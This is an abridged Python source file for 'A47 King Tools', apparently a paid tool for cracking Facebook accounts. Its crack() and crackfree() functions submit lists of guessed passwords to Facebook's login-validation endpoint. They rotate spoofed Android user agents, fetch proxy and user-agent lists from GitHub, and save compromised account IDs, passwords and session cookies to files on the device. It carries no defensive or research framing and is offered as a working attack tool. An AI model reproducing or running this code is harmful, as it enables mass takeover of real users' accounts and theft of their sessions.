...
def main():
    stored_password = "A47xd"  # Replace with your stored password
    ...
    while True:
        ...
        if is_password_valid(user_password, stored_password):
            ...
            print("Welcome to A47 KING TOOLS!")
            os.system('espeak -a 300 "Welcome to A47 King Tools varson 2.7 ..."')
            time.sleep(2)
            os.system('clear')
...
#------------------[ A47-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 13; SM-M546B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.150 Safari/537.36 [FB_IAB/FB4A;FBAV/441.1.0.39.109;] FBNV/1;]",]
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S124DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/110.0.5481.177 Chrome/92.0.4515.166 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A125U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/110.0.5481.177 Chrome/106.0.5249.126 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J530G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/110.0.5481.177 Chrome/106.0.5249.126 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/110.0.5481.177 Chrome/106.0.5249.126 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/110.0.5481.177 Chrome/79.0.3945.136 Mobile Safari/537.36",]
...
princp=[]
try:
    prox= requests.get('https://raw.githubusercontent.com/dxA47-99/F88/main/approved.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://raw.githubusercontent.com/dxA47720/FGJA/main/GFUD-txt').text
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/A47.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-A47 ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • A47 KING]    ║  \033[1;97m  
╠══[Github                   • \33[1;38mA47-KING ]   ║\33[1;34m   
╠══[Whatsapp                 • 016xxxxxxxx ]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
╠══[VERSION                  • 4.2 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m """
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/CYBER-BD71/Fuck./blob/main/Fuck.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m A47 TooLs Daily Update)✅ \033[0;92m")
...
os.system('espeak -a 300 " Welcome,   to,  A47,  King,  Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[A47•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    #sys.stdout.write(f"\r\033[100;92m{bo}[A47•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;97m[\033[0;93mA47-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/A47-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                print(f'\r\033[0;92mA47-Ok] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                #print(f'\r\033[0;92m[A47\033[0;97m•\033[0;92mOk💚] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
                os.system('espeak -a 300 " A47,  Ok,  id"')
                open('/sdcard/A47-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[A47-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mA47-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/A47-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[{time.strftime("%H:%M")}\033[0;97m•\033[0;92mA47-Ok] {idf} \033[0;97m• \033[0;92m{pw} ')
                #cek_apk(session,coki)
                os.system('espeak -a 300 " A47,  Ok,  id"')
                open('/sdcard/A47-OK.txt', 'a').write( cid+' | '+ps+' \n')
                break
